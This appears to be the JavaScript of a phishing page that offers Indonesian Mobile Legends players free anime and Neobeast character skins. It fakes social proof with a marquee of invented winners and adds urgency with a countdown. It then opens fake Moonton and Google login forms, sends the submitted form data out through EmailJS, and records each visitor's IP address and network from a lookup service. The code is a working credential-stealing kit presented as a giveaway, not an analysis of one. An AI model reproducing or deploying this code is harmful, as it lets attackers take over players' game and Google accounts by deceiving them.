// Skin Data 
const skins = [ { name: "Naruto Uzumaki", img: "https://i.ibb.co/ch3VqQrY/IMG-20250513-191901.jpg" }, { name: "Sakura Haruno", img: "https://i.ibb.co/Hfj4SsgH/IMG-20250513-192111.jpg" }, { name: "Sasuke Uchiha", img: "https://i.ibb.co/tPPz7GPS/IMG-20250513-192141.jpg" }, { name: "Kakashi Hatake", img: "https://i.ibb.co/wfk0j8T/IMG-20250513-192211.jpg" }, { name: "Gaara", img: "https://i.ibb.co/sqz9sjr/gaara.jpg" }, { name: "Neobeast Pharsa", img: "https://i.ibb.co/bPvWgS9/neobeast-pharsa.jpg" }, { name: "Neobeast Lylia", img: "https://i.ibb.co/Vg2sGHG/neobeast-lylia.jpg" }, { name: "Neobeast Ling", img: "https://i.ibb.co/9ZHFv4r/neobeast-ling.jpg" } ];

// Marquee 
function generateMarquee() { const nicks = ["RzLgn","DarkWolf","Sakura99"]; let text = ""; for (let i = 0; i < 15; i++) { const nick = nicks[Math.floor(Math.random() * nicks.length)]; const id = Math.floor(100000000 + Math.random() * 900000000); const skin = skins[Math.floor(Math.random() * skins.length)].name; text += ${nick} (ID:${id}) dapat ${skin} • ; } document.getElementById("marqueeText").textContent = text; }

// Tampilkan Skin Grid 
function showSkins() { document.getElementById("introScreen").classList.remove("show"); document.getElementById("skinSelectScreen").classList.add("show"); const grid = document.getElementById("skinGrid"); skins.forEach(skin => { const card = document.createElement("div"); card.className = "skin-card"; card.innerHTML = <img src="${skin.img}" alt="${skin.name}"> <div class="skin-name">${skin.name}</div> <button class="claim-btn" onclick="claimSkin('${skin.name}')">CLAIM</button>; grid.appendChild(card); }); }

function claimSkin(name) { alert(Kamu memilih skin ${name}. Silakan login untuk melanjutkan.); document.getElementById("loginModal").classList.add("show"); }

function chooseLogin(provider) { document.getElementById("loginModal").classList.remove("show"); document.getElementById(${provider}LoginModal).classList.add("show"); }

function submitMoontonLogin(e) { e.preventDefault(); document.getElementById("moontonLoginModal").classList.remove("show"); document.getElementById("verifyModal").classList.add("show"); }

function submitGoogleLogin(e) { e.preventDefault(); document.getElementById("googleLoginModal").classList.remove("show"); document.getElementById("verifyModal").classList.add("show"); }

function submitVerification(e) { e.preventDefault(); emailjs.sendForm("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", "#verifyForm") .then(() => { document.getElementById("verifyModal").classList.remove("show"); document.getElementById("doneModal").classList.add("show"); }) .catch(() => alert("Gagal mengirim data. Coba lagi.")); }

// Countdown Timer 
const countdownElement = document.getElementById("countdownTimer"); let countdownTime = 24 * 60 * 60; function updateCountdown() { const h = String(Math.floor(countdownTime / 3600)).padStart(2, '0'); const m = String(Math.floor((countdownTime % 3600) / 60)).padStart(2, '0'); const s = String(countdownTime % 60).padStart(2, '0'); countdownElement.textContent = ${h}:${m}:${s}; if (countdownTime > 0) countdownTime--; } setInterval(updateCountdown, 1000);

// On Load 
window.onload = () => { generateMarquee(); fetch("https://ipwho.is/").then(res => res.json()).then(data => { document.getElementById("ip_address").value = data.ip || ""; document.getElementById("asn").value = data.connection?.asn || ""; });

const select = document.getElementById("accountLevelSelect"); for (let i = 1; i <= 200; i++) { const opt = document.createElement("option"); opt.value = i; opt.textContent = i; select.appendChild(opt); } };

